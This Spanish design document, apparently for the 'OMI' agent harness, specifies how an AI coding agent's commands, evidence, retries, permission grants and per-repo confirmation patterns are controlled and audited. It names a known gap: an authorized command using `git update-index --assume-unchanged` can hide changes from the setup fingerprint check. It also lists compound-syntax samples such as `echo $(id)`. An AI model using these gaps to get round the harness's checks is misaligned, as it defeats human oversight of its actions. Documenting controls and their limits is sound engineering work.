  - **Presupuesto por llamada.** Cada llamada entra en 120.000 caracteres, medidos en el JSON que se manda: casos, alcance, precedentes, la revisión anterior de Seguridad, evidencia y su parte del diff. Si la evidencia completa no deja lugar para al menos 30.000 de diff, se resume de forma determinista y lo dice en `evidence.summarized`: por paso C el rojo y el verde acreditados (o los últimos), por caso D y por gate la última corrida, y cada salida con su cola y la marca «[recortado: N caracteres]». `omittedRuns` cuenta las corridas que no vinieron. Ejemplo: 5 pasos, un D y 2 gates × 3 vueltas con salidas de 12.000 (≈207 KB) y un diff de ≈600 KB van en 20 llamadas de hasta 120.000, con salidas de 4.000. Si ni resumida entra, primero se vacían los precedentes y la revisión anterior, con una nota. Si tampoco entra (por ejemplo, casos D enormes), el lente falla con un error explícito en vez de mandar una llamada que no entra.
  - **Corridas.** Un lente que falló no se repite sobre el mismo contenido, salvo que un `refuter` posterior apruebe: así un aviso no se borra repitiendo el lente. Un blocker de Seguridad sin aceptar no se esquiva: con él, ni el `pass` del refuter deja repetirlo. Por contenido, cada lente admite tres veredictos y diez corridas: una corrida sin resultado (cancelar, un error del proveedor) no gasta veredictos. Los reintentos de una parte son de la misma corrida.
- **PR:** sólo con cambio limpio y verificado y un SHA autorizado; con `push_pr: ask`, además, confirmación humana remota. Termina en un draft, o en uno por grupo con un stack; no mergea ni cierra el issue.

Dependencia bloqueante, información insuficiente, inferencia nueva o imposibilidad de verificar deben quedar como espera/pausa. Una base que se arma con un comando no es una espera: el agente la prepara con `setup`, en cualquier etapa activa hasta el PR draft. Ejemplo: un worktree nuevo sin `node_modules` corre `npm ci` en Explorar (sin preguntar sólo si lo permite v2 aceptada o su grant exacto vigente), vuelve a reproducir y registra `explored` de nuevo, sin `refresh`. Sólo queda como base faltante lo que un comando no resuelve, por ejemplo una credencial o un servicio externo.

## Evidencia y permisos

`omi_workflow` sólo recibe propuestas de artefactos y acciones. No acepta exit codes, aprobaciones humanas ni resultados de pruebas aportados por el modelo.

- Los comandos se ejecutan con `omi_workflow_check`. Ejecutar código del proyecto usa los permisos de tu usuario; no es una lectura inocua.
- La etiqueta (`setup`, `reproduction`, `red`, `green`, `verification`, `gate`) decide fase y evidencia, no autoriza. Primero prevalecen restricciones independientes y confirmaciones sensibles. Después puede reutilizarse un **grant humano del comando EXACTO** para este trabajo/pedido. **Sin Foundations v2 aceptada, nada pregunta** (el default). **Con v2 y la lista `confirmar` vacía, tampoco**: no hay patrón que contrastar. Con reglas, sin grant, sintaxis no soportada o match de patrón siempre pide sí, y sólo una línea SIMPLE no coincidente corre sola; receta humana/auto no neutraliza esta precedencia.
- Si hace falta, OMI ofrece **Sí**, **No** y **Editar reglas**, sin consentimiento preseleccionado. Con un comando simple suma **Sí, y no volver a preguntar por «prefijo \*» en este repo** (ver abajo). Muestra comando, checkout, repo, KB/producto y alcance. PgUp/PgDn desplaza el detalle TUI sin ocultar decisiones; RPC usa selector nativo. Sin UI no concede permisos.
  - **Sí** guarda el grant en el trabajo, ligado a id de trabajo + hash del pedido + comando. Sobrevive a `/reload`, `resume`, aprobar receta y `replan`; cambiar pedido o `refresh` lo invalida. No toca KB, no usa prefijos/globs ni autoriza otros trabajos.
  - **Sí, y no volver a preguntar** (pedido del dueño, 2026-11-24, como en Claude Code) guarda el prefijo del comando para el repo, en esta máquina: `<OMI_HOME>/agent/command-allow`, por KB, producto y repo. No toca la KB. Desde ahí, un comando SIMPLE que empieza con ese prefijo, token por token, corre sin preguntar, también en otros trabajos y aunque coincida con una regla de `confirmar`. Nunca cubre un comando compuesto ni las confirmaciones obligatorias de OMI (merge, workflows, deploy, secretos). Sin Foundations aceptada, o con la lista vacía, no hace falta: ahí no pregunta nada. El prefijo es programa y subcomando; con `npm`, `pnpm`, `yarn` o `bun` seguidos de `run`, `exec`, `x` o `dlx`, también el script, y con `-m`, el módulo. Ejemplos: `git log --oneline -5` → `git log *`; `npm run typecheck` → `npm run typecheck *`; `python3 -m pytest x` → `python3 -m pytest *`. `git log *` cubre `git log` y `git log --stat`, no `git logs` ni `git log | head`. No se ofrece sin subcomando (`git`), con una opción en su lugar (`git -c x fetch`, `node -e x`) ni con un envoltorio (`env`, `sudo`, `xargs`, `timeout`…): cubrirían demasiado. Hasta 100 por repo. Si el archivo no se puede leer, agregar o quitar falla sin pisarlo. Se ven en la pestaña OMI, bajo Foundations, y se quitan con `/omi-permitidos`, con un sí.
  - **Editar reglas** abre la guía con el borrador vigente, sin excepciones automáticas, escrituras ni grants. Sólo Guardar explícitamente modifica la configuración. Cerrar la edición, incluso guardando, **NO ejecuta el comando pendiente**: hay que reintentarlo para evaluar de nuevo. En RPC esta edición exige abrir la TUI; no hay fallback a JSON ni permiso temporal.
  - **No**, Esc, cerrar, respuesta desconocida o error no ejecutan ni conceden grants. Un guardado parcial informa si la KB pudo guardar o si también quedó aceptado localmente, sin ejecutar ni inventar éxito. No se reintenta un envío después de cancelar.
  - Se revalida el trabajo durable antes de guardar/aceptar o ejecutar: una decisión vieja tras pausa o cambio de otra ventana no vale.
  Ejemplo: con `git push *`, ser D5 no autoriza `npm run typecheck && git push origin main`; `npm run typecheck` solo corre sin preguntar, o reutiliza su grant humano exacto.
- Setup corre en cualquier etapa activa hasta el PR draft, también antes de aprobar la receta, con la misma autorización. Nunca acredita una prueba y sus errores se muestran.
- Después del PR draft (PR draft abierto, Review, Land, Ship, o con el PR adoptado), `omi_workflow_check` sólo corre durante una corrección en curso: una ronda de `/omi-work fix` o un fix-forward en su checkout. Así un setup no es un camino para disparar workflows por fuera del lifecycle. Ejemplo: con el PR adoptado en Review, `setup` con `gh workflow run claude-review.yml -f pr=8` se rechaza sin ejecutar y guía a `/omi-work review`. Con la corrección ya verificada y el push todavía sin hacer, tampoco corre.
- Fuera de Implementar, un setup prepara lo que Git ignora (por ejemplo, `node_modules`). Si cambia archivos versionados, no ignorados o HEAD, devuelve un error. No se revierte solo; el cambio queda a la vista en `git status`. Es una detección con el fingerprint, no un sandbox: un comando autorizado que le esconde cambios a Git (por ejemplo, con `git update-index --assume-unchanged`) no se detecta.
- La reproducción corre en Explorar, Resolver inferencias (donde se puede volver a registrar `explored`) y Diagnóstico.
- El runner registra salida acotada a 12.000 caracteres, exit code, interrupción, HEAD, fingerprint y tiempos. No imprime el entorno ni mensajes internos potencialmente sensibles del backend. La salida del propio programa puede contener datos sensibles: no autorizar comandos que revelen secretos.
- Un rojo que pasa, comando ausente, cancelación o contenido modificado durante el comando no se convierte en prueba válida. Los intentos fallidos quedan registrados sin habilitar pasos.
- El fingerprint representa contenido cambiado desde la base y archivos nuevos no ignorados, incluidos modos/eliminaciones/symlinks. Permanece estable al hacer stage/commit del mismo contenido.
- Las pruebas de cada paso y su commit deben coincidir. La verificación final debe corresponder al contenido actual; un verde histórico o un comando distinto no alcanza.
- Hay 3 retry por trabajo. La vuelta 0 es la pasada inicial y cada `retry` abre la siguiente, hasta la vuelta 3. El cuarto `retry` ya no abre vuelta: el host deja el trabajo esperando con «Se agotaron las vueltas; se necesita intervención humana». La cuenta sale del estado (`roundBudget`), la misma que aplica el reducer, y se ve en la línea «Presupuesto: vuelta 2 de 3 · queda 1 retry · amends 2 de 2»: en el contexto del agente, en `/omi-work status` y en el detalle del progreso. Con el PR adoptado no hay línea: la corrección post-PR tiene su propio presupuesto.
- `retry` es para un blocker de Seguridad sin aceptar, o para un D o un gate rojo sin amend disponible (ya se usaron los dos, o el checkout está sucio y amend no puede). Con el contenido limpio vale la última corrida de cada D y de cada gate sobre ese contenido, como en `amend`: un rojo ya corregido o que no se reprodujo no pide vuelta. Si sólo hay avisos, o si un amend alcanza, `retry` se rechaza y apunta a `amend`. Si lo único que no pasó quedó interrumpido o es un comando ausente (126/127), `retry` también se rechaza con el mismo texto que `amend`: se vuelve a correr o se corrige el comando. Cortado con el tope del host (1800 s), más tiempo no hay: ese corte cuenta como rojo y `retry` sigue; `amend` lo rechaza con ese mismo motivo. Cuenta sólo si el host lo marcó al guardar la salida («[OMI: cortado por el tope del host de 1800 s]»), porque Pi lo cortó con el tope: 1800 s de reloj por un Esc o una laptop suspendida no alcanzan. Ejemplo: en la vuelta 3 de 3, `npm test` se corta a los 240 s; antes `retry` dejaba el trabajo con las vueltas agotadas, ahora pide volver a correrlo. Con el checkout sucio, `retry` no trae el contenido y vale toda la vuelta. Los topes de evidencia y de lentes siguen pidiendo `retry` o `refresh`. Con 0 retry, el agente usa `retry` igual si sigue un bloqueo: así frena el host, no una pausa.
- `pause` es sólo para una decisión humana concreta, y su motivo la nombra: qué hay que decidir y entre qué opciones. Ejemplo: «aceptar o no el riesgo de `src/a.ts:12`». No se pausa por contar vueltas ni por algo que un paso pendiente, `retry` o `amend` todavía resuelven. En #98 el agente pausó con un retry disponible, y en #99 pausó sin implementar C8.
- Un blocker de Seguridad que no aplica (ya estaba en `main`, queda fuera del modelo de amenazas o contradice una decisión documentada) no gasta la vuelta: el agente pausa nombrando la decisión y una persona lo acepta con `/omi-work accept-risk`. Si las vueltas se agotaron sólo por ese blocker, aceptarlo las destraba. Un D o un gate rojo sobre el contenido las deja agotadas; uno interrumpido no, porque no es un rojo: el agente lo vuelve a correr.
- Con 0 retry y un problema real, una persona suma una vuelta con `/omi-work extra-round`. Ejemplo: #99, en la vuelta 3 de 3 con C8 pendiente, pasa a 3 de 4; con `resume` retoma C8.
- Reintentar invalida pruebas activas y conserva sus resultados en un archivo de intentos anteriores; no pueden acreditar la nueva vuelta. Los pasos ya commiteados siguen hechos y la vuelta agrega un paso de corrección `C<n>` que cubre todos los D, con su propio rojo, verde y commit. Ese paso conserva la aprobación porque usa los mismos casos y comandos aprobados; su título lo escribe el agente y la persona no lo aprueba aparte. Se mantiene la aprobación sólo si pedido, receta y spec son exactamente los mismos.
- Cambiar el pedido invalida receta/aprobación/pruebas cuando se contrasta con GitHub, en los checkpoints de inicio/retoma, planificación, aprobación y publicación. El contraste ignora la sección del harness: escribirla, o que alguien la toque, no invalida nada.
- Si el alcance cambia en el chat, lo dicho vale: el agente lo registra como acuerdo con la cita textual de la persona y rehace la receta (ver «El chat como autorización»). No hace falta editar el issue ni `refresh`, y el cambio no pasa como un ajuste silencioso del Cómo.

Mientras el flujo está activo, shell arbitrario, tools desconocidas y operaciones OMI no están habilitadas por el harness. `omi_ask` sí, en toda etapa, cuando la sesión la ofrece (sólo con la TUI interactiva): preguntarle a la persona no cambia nada. Su respuesta es un dato, no un acuerdo del chat ni un permiso: no sirve como cita de `agreed`, no aprueba la receta ni autoriza comandos. Las inferencias siguen respondiéndose con `omi_workflow` `ask`. Por la misma regla, el agente tampoco puede guardar ni borrar en la KB (`mcp__harness_kb__guardar` y `borrar`, también desde un subagente): Foundations lo edita una persona. Edit/write requieren receta aprobada y C activo, con paths relativos dentro del checkout (sin `~` ni `file://`, que Pi expandiría afuera) y sin metadata Git ni rutas evidentes de secretos. Código como `credentials.ts` y plantillas como `.env.example` sí se pueden editar. El commit del paso trata sus paths como literales, no como pathspecs. Las tools conservan el pipeline y hooks de Pi. **No es una frontera de seguridad:** comparte usuario, filesystem y credenciales; un comando aprobado ejecuta código arbitrario con esos permisos. No reemplaza aislamiento del sistema operativo ni los guardrails de OMI. Las reglas del proyecto prevalecen.

### Cola de checks y timeouts

Dos worktrees del mismo repo que corren la suite completa a la vez se frenan entre sí. En #98 y #99, `npm test` tardó de 3,5 a 6 min, el agente pidió timeouts de 110 y 240 s y dos corridas murieron sin código.

- **Qué espera turno.** Un check pesado: un gate o un setup sin historia, o un comando que alguna vez tardó 30 s o más (también uno interrumpido). Sólo una corrida completa prueba que un comando es liviano: un `npm test` cortado a los 5 s por un Esc no le saca el turno al siguiente. La duración sale de la evidencia guardada (`finishedAt − startedAt`) del mismo comando exacto, de cualquier vuelta. Un setup no se guarda en el estado: el host recuerda en memoria lo que tardó cada setup de la sesión, por trabajo (hasta 50). Así sólo el primer setup de un comando espera turno; si tardó menos de 30 s, los siguientes no. Ejemplo: `npm ci` de 5 s espera la primera vez detrás del `npm test` de otro worktree y después ya no. Al reabrir OMI esa memoria se pierde y el primero vuelve a esperar.
- **Cómo espera.** El turno es `<commonDir>/omi/check-turn.lock` (en este repo, `.git/omi/check-turn.lock`), 0600, con PID, host, worktree, etiqueta y comando. Se toma antes de la foto del checkout: una espera larga no invalida el fingerprint y `startedAt` cuenta desde que el comando corre. Reintenta cada 1 s. El progreso dice a quién espera: «Esperando turno de checks · npm test en issue-98». Esc cancela sin correr el comando ni registrar evidencia.
- **Cuándo se retira.** Es cortesía, no un lock de integridad. A diferencia del lock del estado (`store.ts`, que jamás se roba por edad ni por PID), se retira si su PID ya no existe en el mismo host o si lleva 15 min sin liberarse: equivocarse sólo hace correr dos checks a la vez. Un dueño de otro host sólo se retira por edad. Si a los 15 min de espera el turno sigue renovado, el check corre igual.
- **Falla abierta.** Con un enlace o algo que no es un archivo común en esa ruta, un error de disco o la espera agotada, el check corre sin turno y lo dice. Quien espera nunca crea archivos.
- **Avisos,** al final de la salida del check:
  - «Esperó menos de 1 min el turno de checks del repo: lo tenía npm test en issue-98.»
  - «Se retiró el turno de checks del repo que tenía npm test en issue-98: su proceso ya no existe.»
  - «Se retiró el turno de checks del repo que tenía npm test en issue-98: llevaba 15 min o más sin liberarse.»
  - «Esperó 15 min el turno de checks del repo y corre igual: lo sigue teniendo npm test en issue-98.»
  - «El turno de checks del repo (<ruta>) es un enlace o no es un archivo común: corre sin turno y no lo toca.»
  - «No se pudo usar el turno de checks del repo (<motivo>): corre sin turno.»
- **Sin latido.** Un check de más de 15 min pierde el turno ante el próximo que espera, y los dos corren a la vez. Retirar tiene una ventana entre leer y borrar: en el peor caso, también corren dos a la vez.
- **Timeout informado.** Sin `timeoutSeconds`, el default es 300 s. Uno menor que 1,5× la última corrida completa del mismo comando sube a ese piso, con tope de 1800 s, y la salida lo dice. Cuenta también un setup de la sesión: la suite corrida como setup antes del último C le da el piso al gate de Verificar. Ejemplo: «timeoutSeconds 240 → 346: la última corrida completa de este comando tardó 230 s; el host deja 1,5× de margen.».
- **Corte por tiempo.** Si Pi lo corta, la corrida queda interrumpida: no cuenta como completa. La salida sugiere el doble del usado o 1,5× lo conocido (también lo medido como setup), con tope de 1800 s. Ejemplo: «Se cortó por tiempo a los 240 s. No cuenta como corrida completa: quedó interrumpida. Volvé a correrlo con timeoutSeconds: 480.». Con el tope ya usado, no sugiere más tiempo: un D o un gate cuentan como rojo y piden `retry`; un gate o un setup se parten en comandos más chicos, y un D, cuyo comando fija la receta, se pausa con el motivo.
- Un binario anterior no conoce el turno: corre sin esperar, como antes. Un PID reusado o un cambio de hostname en macOS hacen esperar hasta 15 min.

## El chat como autorización

Lo que la persona escribe en el chat vale como autorización de alcance. Ejemplo: «sumá también que `other.cjs` devuelva 2».

1. El agente llama a `omi_workflow` con `action: "agreed"`, `quote` (un fragmento textual del mensaje, sin comillas), `agreement` (lo acordado) y `replan` (si cambia la receta).
2. OMI busca la cita en los mensajes de la persona de la rama actual de esta sesión. Compara sin distinguir espacios ni saltos de línea. No cuentan el texto del modelo, los resultados de tools (tampoco una respuesta de `omi_ask`) ni los mensajes que manda una extensión (por ejemplo, el arranque del harness). Una cita que no aparece se rechaza y no se anota nada. La cita tiene que tener al menos 3 palabras o 15 letras o números: un fragmento trivial («ok», «dale», «a») aparece en cualquier mensaje y se rechaza.
3. El acuerdo queda en el estado, en la sección del issue (enseguida; con `replan`, la receta figura «en revisión» hasta el nuevo sí), en la revisión de la receta y en el PR draft. OMI lo muestra en la TUI al registrarlo.
4. Con `replan`, si ya había receta, se vuelve a Preparar receta. Siguen valiendo la exploración, las respuestas, los acuerdos y los commits. La aprobación, los pasos y las pruebas de la receta anterior pasan a intentos anteriores, y la base explorada pasa a ser el código actual, el de los pasos commiteados. Por eso un `replan` pide el checkout limpio: con cambios sin commitear el acuerdo se rechaza sin cambiar nada, porque en Preparar receta el agente ya no podría commitearlos. Ejemplo: a mitad de un paso, el agente termina y commitea el paso activo y vuelve a registrar el acuerdo, o lo registra sin `replan`. La receta nueva se aprueba como cualquier otra. Antes de la receta, el acuerdo sólo se anota y el agente lo usa al planificar. Con las vueltas de corrección agotadas, un acuerdo sin `replan` también sólo se anota y uno con `replan` se rechaza: un acuerdo del chat no reinicia las vueltas ni levanta el bloqueo; eso lo hace una persona con `/omi-work refresh`.

La verificación prueba que la persona escribió esas palabras, no que el resumen del agente las interprete bien. Por eso el acuerdo se muestra entero, con su cita, y un cambio de receta vuelve a pedir el sí. Los acuerdos sobreviven a `refresh`: son palabras de la persona, no del pedido. Para retirarlo, se dice en el chat.

## Foundations: comandos y permisos por repo

Foundations es la configuración del harness para un repo: **patrones que requieren confirmación humana**, no una lista de comandos permitidos. Lo decide la persona en la KB de Harness. Sólo aplica al harness; no cambia el bash del chat general ni `/settings` de Pi. No es la etapa Fundación ni un sandbox.

Sin Foundations v2 aceptada, nada pregunta: los tres puntos van en `auto` y ningún comando pide sí. Foundations sirve para poner en `ask` los que quieras y para listar los comandos que piden confirmación. Ejemplo: `"confirmar": ["git push *"], "politica": { "arranque": "auto", "receta": "ask", "push_pr": "ask" }` arranca solo y corre `npm test` sin preguntar, pero te muestra la receta, pide el sí antes de `git push origin main` y antes del push del PR.

### Dónde vive

- En las **perillas** del producto, en la KB (`harness-kb`), dentro de un bloque `omi-foundations`. El resto del documento de perillas es de otros usos y no se toca.
- El producto es el nombre del repo de `origin` en github.com. Ejemplo: `github.com/chichex/omi-code` → producto `omi-code`.
- Tiene que estar en tus productos de la KB (`mis_productos`). Si no, no hay Foundations: vale el default (todo `auto`).
- El bloque declara su `repo`. Sólo aplica si coincide con `origin`: dos repos con el mismo nombre (`chichex/medicine`, `pramaestudio/medicine`) tienen un bloque cada uno. Un trabajo cuyo issue es de otro repo usa el default: todo `auto`.

### Formato

JSON estricto, en una cerca con info string exacta `omi-foundations`:

````md
## Foundations de omi · chichex/omi-code

```omi-foundations
{
  "version": 2,
  "repo": "chichex/omi-code",
  "confirmar": ["git push *", "npm publish", "rm *"],
  "politica": { "arranque": "ask", "receta": "ask", "push_pr": "ask" }
}
```
````

- `version`: únicamente `2`. `repo`: `owner/name` en minúsculas. Sin campos extra ni defaults implícitos.
- `confirmar`: hasta **100 reglas**, únicas exactas, de **1–2000 unidades UTF-16** (`string.length`). Sin espacios en extremos. Una cadena vacía en JSON es inválida; la lista vacía sí es válida y guardar/aceptar advierte que **ningún comando del proyecto pide confirmación por ESTA política, tampoco uno compuesto**. Pedido del dueño (2026-11-24): antes, con la lista vacía, un comando compuesto pedía sí aunque `git push origin main` simple ya corriera solo.
- Se rechazan exactamente Unicode **Cc, Cf, Zl, Zp y U+E0100..U+E01EF**: incluye tabs, LF/CR, bidi y ancho cero. Errores por regla/línea con escape visible, nunca controles activos en la terminal.
- `politica`: sólo `arranque`, `receta`, `push_pr`, con `ask|auto`. Se retiraron la allowlist `comandos` y `fuera_de_catalogo`.
- Hash canónico de versión, repo, reglas ordenadas y políticas: reordenar/reformatear no cambia identidad; cambiar contenido, repo o políticas sí.
- Ausente, inválido u obsoleto (v1): no vale. Rige la última v2 aceptada o, sin ninguna, el default: nada pregunta. JSON roto, cerca sin cerrar, bloques duplicados o repo ilegible nunca se leen como una lista vacía aceptada ni se sobrescriben a ciegas.

### Matcher y puerta sintáctica conservadora

El glob compara la **línea completa**, sensible a mayúsculas y sin trim, normalizar espacios, tokenizar para coincidir, expandir archivos ni evaluar regex. `*` significa cero o más puntos de código Unicode, incluidos espacios; `?` uno. En patrones, `\*`, `\?` y `\\` son literales de *, ? y backslash; cualquier otro escape o backslash final es inválido. El resto de signos, incluidos metacaracteres de regex, son literales. La implementación tiene costo acotado, sin backtracking exponencial.

Con reglas, sólo puede autoejecutarse una línea SIMPLE: uno o más tokens separados únicamente por espacios ASCII; cada token usa `[A-Za-z0-9_./:@%+=,-]`. Sin espacios iniciales/finales, vacíos ni `=` en el primer token. Ese primer token literal tampoco puede ser `if`, `then`, `elif`, `else`, `fi`, `for`, `while`, `until`, `do`, `done`, `case`, `esac`, `in`, `select`, `function`, `time`, `coproc`, `eval`, `exec`, `command`, `builtin`, `source` o `.`.

Cualquier otra sintaxis pide sí explícito: comillas, backslash en el comando, controles/invisibles, `&&`/`||`, pipes, redirecciones/heredocs, background, agrupaciones, expansiones, globbing y multilínea. **No se rechaza para ejecución ni se altera el comando**: puede autorizarse exacto por la persona. No se analizan componentes para autoautorizar.

Con `git push *`, `git push origin main` pide sí; `git push` sin el espacio/argumentos no coincide (agregar esa regla si también se quiere confirmar). `npm test` simple no coincidente puede auto con v2 aceptada. Con al menos una regla, `npm test && git push origin main`, `echo "texto"`, `VAR=x npm test`, `echo $(id)` y multilínea siempre piden sí salvo su grant exacto. Con la lista vacía corren sin preguntar.

No se infiere qué hace un ejecutable, wrapper, script, alias o función. Un patrón textual no cubre todas las formas semánticas de hacer push. **No es sandbox**; prohibiciones del proyecto y confirmaciones sensibles de OMI prevalecen.

### Qué decide cada política

| Punto | `ask` | `auto` (default) |
|---|---|---|
| `arranque` | El sí de `omi_work_begin` o de Enter en Issues | Crea el issue, el worktree y la sesión sin preguntar, con el texto del agente. Las guardas sin efectos fallan igual antes |
| `receta` | La revisión de la receta | El agente aprueba su propia receta, también tras un `replan`. Se revalida y registra `aprobada por Foundations`; nunca concede grants ni dispensa sí por patrones o sintaxis |
| `push_pr` | El sí para push y PR draft, sobre el cuerpo exacto del PR | Push de la rama y PR draft sin preguntar. Nunca mergea ni fuerza |

La autorización de comandos es independiente de estas tres políticas y de su etiqueta. Las reglas de fase/evidencia no cambian. Nada habilita merge, tags, workflows, deploys, secretos ni violar prohibiciones del proyecto.

### Aceptar una revisión

1. Al arrancar la sesión, OMI lee las perillas en segundo plano, sin preguntar ni escribir la KB. En una sesión nueva, si falta configurar algo, el [setup](#setup-de-lo-que-falta) lo ofrece después de esa lectura.
2. En el primer punto del harness que necesita la política (el arranque, `/omi-work resume`, `approve`, `pr` o el primer comando), si la revisión v2 es nueva, la aplica sin preguntar y avisa la diferencia vertical contra la última aceptada (o contra el default, si no había ninguna). Cada `auto` y la lista vacía traen su aviso. También sin UI. Abrir la guía no la acepta. Ejemplo:

   ```
   Foundations · chichex/omi-code · KB omi-code (kb-prod-chiche.ohmyinfra.com)
   Antes: última revisión aceptada e0cabd0f
   Patrones que requieren confirmación:
     + git push *
       npm publish
   Sólo comandos simples no coincidentes corren sin preguntar por esta política.
   Políticas:
     push + PR draft: ask → auto   ⚠ hace push de la rama y abre el PR draft sin preguntar; nunca mergea ni fuerza
   ```

3. Toda revisión nueva se aplica y se avisa, también si sólo quita permisos. La misma revisión en otro documento de perillas (alguien editó otra parte) no vuelve a avisar; sólo actualiza la metadata local de esa aceptación.
4. El registro **v2** vive en `<OMI_HOME>/agent/foundations/` (por defecto `~/.omi/agent/foundations/`), 0600, por KB, producto y repo. Guarda la aceptación y el «Más adelante» del setup (`deferred`, por revisión). Un registro v1 cuenta como nada aceptado; el setup lo distingue de la ausencia y avisa «Tu configuración de Foundations es de un formato anterior que ya no se usa: configurala de nuevo». Un registro v2 que todavía trae el `offerDeclined` anterior conserva su aceptación; ese campo se ignora y se quita en la próxima escritura.
5. La revisión queda **fija toda la sesión**: un cambio externo en la KB a mitad de sesión no se aplica. Sobrevive a `/reload` y viaja a la sesión del worktree con `omi_work_begin`, sin otro aviso. La sesión siguiente aplica la revisión nueva y avisa la diferencia. La excepción es Guardar en la guía: tras persistir y aceptar, reemplaza el pin; una decisión anterior pendiente no lo pisa.

Sin ninguna v2 aceptada vale el default: `auto` en los tres puntos y ningún comando pregunta.

### Sin KB

| Situación | Vale en la sesión |
|---|---|
| `--offline`, `PI_OFFLINE`, `--no-mcp`, `-builtin:mcp`, `--no-extensions`, sin login, KB lenta (tope de 10 s) o `harness-kb` redefinido en `mcp.json` | La última v2 aceptada; si no hay, el default (todo `auto`) |
| Perillas sin bloque para el repo | La última v2 aceptada, con aviso; si no hay, el default, y el [setup](#setup-de-lo-que-falta) ofrece armarlo |
| Bloque inválido o v1 | La última v2 aceptada, con aviso y el motivo; si no hay, el default. No se interpreta como lista vacía aceptada |
| Revisión nueva sin UI | La revisión nueva: aceptarla no necesita UI |
| Producto inexistente o sin acceso | El default; no crea productos ni finge guardado |

Esto describe la lectura inicial: un pin v2 ya aceptado/fijado no se relee en cada comando. No se promete sincronización instantánea con cambios externos. Sin KB no se acepta un borrador que no pudo guardarse.

OMI lee la KB por la conexión MCP de Pi, sin el modelo. Si `~/.omi/agent/mcp.json` o `.pi/mcp.json` definen `harness-kb`, no la usa: podría ser otro servidor.

### Qué escribe en la KB y cuándo

Sólo **Guardar explícitamente** desde la guía escribe una revisión de las perillas y su aceptación local. Aceptar una revisión de la KB sólo escribe el registro local. El agente no obtiene una tool libre para editar la KB. Leer/abrir/cancelar nunca guarda; los tests usan mocks, no políticas reales.

**Guía de Foundations**

- Se abre con **f** en la pestaña OMI (Ctrl 5), «Foundations» en la paleta (Ctrl K), `/omi-foundations`, `/omi-work foundations` o **Editar reglas** del permiso. No inicia ni retoma trabajo. Sin ninguna v2 aceptada, el [setup](#setup-de-lo-que-falta) lo ofrece solo al entrar al harness y al abrir una sesión interactiva nueva, con **Configurar ahora** o **Más adelante**; nunca al hacer reload, resume ni restore. Ofrecerlo no cambia las políticas: sin Foundations v2 nada pregunta.
- Mientras lee la KB muestra una espera. Esc la cancela sin abrir la guía ni cambiar nada.
- Son [preguntas en tanda](#preguntas-en-tanda), con las mismas teclas. No es un formulario, JSON ni una respuesta libre de `omi_ask`. Tiene tres pantallas:
  1. **Guía Foundations · `<repo>`.** Una pregunta por política (Arranque, Receta y Push + draft), con «Conservar (ask)» o «Cambiar a (auto)» y lo que hace cada modo. Otra por las reglas, con la lista vigente: «Conservar reglas» o «Cambiar reglas».
  2. **Reglas.** «Revisar borrador», «Agregar regla» y una opción por regla, con el contador. Ejemplo: `¿Qué cambiás en las reglas? (1/100)`. Cada regla se abre sola: se conserva, se quita o se reescribe con «Escribir otra respuesta». El patrón es para la línea completa: `*` es cualquier texto, `?` un carácter, y `\*`, `\?` y `\\` son literales. Ejemplo: `git push *`.
  3. **Resumen.** El diff contra lo último aceptado y **Guardar**, **Volver a reglas** o **No guardar**. Guardar nunca es la opción recomendada. Con la lista vacía, Guardar avisa que ningún comando del proyecto pide confirmación por esta política. Volver a reglas conserva el borrador.
- Entrar/reabrir precarga la v2 vigente sin aceptarla. Si la KB no tiene el bloque, rige lo último aceptado en esta máquina y la guía parte de ahí, para no perderlo. Lo dice en la primera pregunta: «La KB no tiene Foundations. El borrador parte de lo que aceptaste antes en esta máquina (revisión 1a2b3c4d). Guardar lo crea en la KB.» El resumen pregunta «La KB no tiene Foundations. ¿Lo creás con estas reglas y políticas?», así no parece «sin cambios». Sin nada aceptado, o con v1, empieza con reglas vacías y las políticas del default (`auto`), nunca comandos de la v1 ni sugerencias. La aceptación anterior y la precarga son datos separados en el diff.
- Una regla se valida al escribirla y no se recorta ni se normaliza. Se rechazan, con el motivo, los espacios al borde, un control o invisible, un escape inválido y un patrón exacto repetido. El texto queda para corregirlo. Máximo 100 reglas.
- **Esc** en cualquier pantalla sale sin guardar ni aceptar.
- Desde un comando pendiente, abrir/cancelar/guardar **nunca lo ejecuta ni crea grant**. Siempre hay que reintentarlo, aun si las reglas cambiaron.

**Corte limpio y persistencia**

- Únicamente formato v2. Bloques, pins y aceptaciones v1 son obsoletos: no se migran, invierten ni eliminan automáticamente. Hay que configurar/guardar de nuevo: el setup los detecta y lo ofrece. **Más adelante** sobre un registro local v1 lo reemplaza por uno v2 que sólo guarda la postergación, sin trasladar sus comandos ni políticas.
- El guardado explícito puede reemplazar sólo el bloque antiguo inequívoco de ese repo, sin interpretar/trasladar sus comandos o políticas. Conserva byte a byte lo ajeno. JSON/cercas mal formadas, repo ambiguo o duplicados fallan sin sobrescribir a ciegas.
- Requiere KB/producto accesibles e identidad KB/producto/origin/issue consistente. Relee para componer, valida expectativa de revisión, comprueba otra vez antes de enviar y confirma contenido/producto/tipo y que siga vigente antes de aceptar localmente. Cambios detectados o un trabajo pausado/desactualizado bloquean.
- Respuesta perdida: clave idempotente estable, relectura antes del retry y nunca reenvío sobre una revisión concurrente ni después de abortar. Fallos parciales distinguen documento posiblemente guardado, verificación KB completa y aceptación local durable. No hay fallback a grant temporal ni éxito sin persistencia.
- Las escrituras del registro local se serializan por ruta real dentro del proceso y reemplazan el archivo atómicamente. Una aceptación pendiente compara la revisión local que leyó antes de preguntar, dentro de esa cola y después del I/O: no puede pisar la aceptación de un Guardar posterior aunque su pin todavía no se haya reemplazado. Se prueban la intercalación con barreras y un fallo antes del rename conservando los bytes anteriores. Esto no es CAS ni lock entre procesos externos.
- Los guardados explícitos coordinan su turno por identidad KB/producto/repo dentro del proceso, aunque usen sesiones o clientes distintos. Capturan la expectativa local antes del I/O y revalidan la revisión remota dentro de la cola de escritura, antes del reemplazo local; antes de publicar el pin comprueban otra vez turno, KB y aceptación durable. Un Guardar A retenido no vuelve a aceptar ni publicar A después de un Guardar B más nuevo. Si hay conflicto, informa el estado parcial sin ejecutar comandos.
- Las perillas resultantes deben entrar en el límite legible del cliente de KB (**400.000 caracteres**, incluido JSON escapado y contenido ajeno); excederlo falla antes de enviar, sin rebajar límites de validación de reglas.
- **Concurrencia optimista, no CAS ni exclusión mutua remota**: todavía existe la ventana entre última lectura y envío. No se promete atomicidad distribuida ni se implementa limpieza de datos reales.

`/omi-work status`, la [pestaña OMI](#pestaña-omi) y el progreso muestran origen/revisión, tres políticas, patrones verticales y avisos; nunca concatenan reglas con pipes. La pestaña OMI suma qué hace cada política y el motivo, por ejemplo el formato anterior.

### Límites

